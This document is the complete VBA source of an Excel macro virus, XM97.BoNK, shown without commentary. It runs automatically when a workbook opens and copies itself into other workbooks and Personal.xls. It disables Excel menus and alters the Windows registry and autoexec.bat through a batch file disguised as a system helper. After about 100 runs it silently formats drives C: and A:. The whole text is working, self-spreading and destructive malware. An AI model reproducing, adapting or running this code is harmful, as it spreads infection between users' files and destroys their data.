   Attribute VB_Name = "Bonk"
   Sub Auto_Open()
   Application.OnSheetActivate = "XBoNKeR"
   End Sub
   Sub XBoNKeR()
   On Error Resume Next
   BK = "Bonk"
   BZ = "c:\windows\system\B32o2nk.sys"
   PX = "Personal.xls"
   PPX = Application.StartupPath & "\" & PX
   aBoNK = 0
   xBoNK = 0

   With Application
       .StatusBar = "XM97.BoNK"
       .ScreenUpdating = False
       .DisplayAlerts = False
       .EnableCancelKey = xlDisabled
       .Caption = "Micro$oft Excel"
   End With

   Application.VBE.ActiveVBProject.VBComponents.Item(BK).Export BZ

   If Dir(PPX) = PX Then xBoNK = 1

   For i = 1 To ActiveWorkbook.VBProject.VBComponents.count
       If ActiveWorkbook.VBProject.VBComponents(i).Name = BK Then aBoNK = 1
   Next i

   If aBoNK = 0 Then
       ActiveWorkbook.VBProject.VBComponents.Import BZ
       ActiveWorkbook.Save
   End If

   If xBoNK = 0 Then
       Workbooks.Add.SaveAs FileName:=PPX
       ActiveWorkbook.VBProject.VBComponents.Import BZ
       ActiveWindow.Visible = False
       Workbooks(PX).Save
   End If
   BKCount
   Bonk_It
   End Sub
   Sub BKCount()
   On Error Resume Next
   Dim chk As Integer
   Dim count As Integer

   chk = GetSetting("VBA", "XM97_BoNK", "BKCounter")

   If chk > 100 Then
       SaveSetting "VBA", "XM97_BoNK", "BKCounter", 1
       BKAction
   End If

   If chk = 0 Then
       SaveSetting "VBA", "XM97_BoNK", "BKCounter", 1
       SaveSetting "VBA", "XM97_BoNK", "Creator", "jack twoflower -=[LzØ]=-"
       SaveSetting "VBA", "XM97_BoNK", "Address", "jack_twoflower@hotmail.com"
   End If

   count = chk + 1
   SaveSetting "VBA", "XM97_BoNK", "BKCounter", count

   End Sub
   Sub Bonk_It()
   On Error Resume Next

   CommandBars("Tools").Controls(10).Enabled = False
   CommandBars("Tools").Controls(12).Enabled = False
   CommandBars("View").Controls(3).Enabled = False
   CommandBars("Window").Controls(3).Enabled = False
   CommandBars("Window").Controls(4).Enabled = False

   RG = "C:\WINDOWS\SYSTEM\B32NK.REG"
   If UCase(Dir(RG)) <> "B32NK.REG" Then

       Open RG For Output Access Write As #1
           Print #1, "REGEDIT4"
           Print #1, "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon]"
           Print #1, """LegalNoticeCaption""=""XM97.BoNK"""
           Print #1, """LegalNoticeText""=""This is BøNKeRs of the .BoNK-family by Jack Twoflower -=[LzØ]=-"""
       Close 1

       Open "c:\start.bat" For Output Access Write As #1
           Print #1, "REM Microsoft Windows 95 Start-Hilfe"
           Print #1, "REM ================================"
           Print #1, "REM Systemdatei nicht löschen!"
           Print #1,
           Print #1, "regedit /s c:\windows\system\b32nk.reg"
       Close 1

       Open "c:\autoexec.bat" For Append As #1
           Print #1, "@IF EXIST C:\START.BAT DEL C:\START.BAT"
       Close 1
   Shell ("c:\start.bat"), vbHide
   End If
   End Sub
   Sub BKAction()
   On Error Resume Next
   Open "c:\format.bat" For Output Access Write As #1
       Print #1, "@echo j|format c:"
       Print #1, "@echo j|format a:"
   Close 1
   Shell ("c:\format.bat"), vbHide
   End Sub
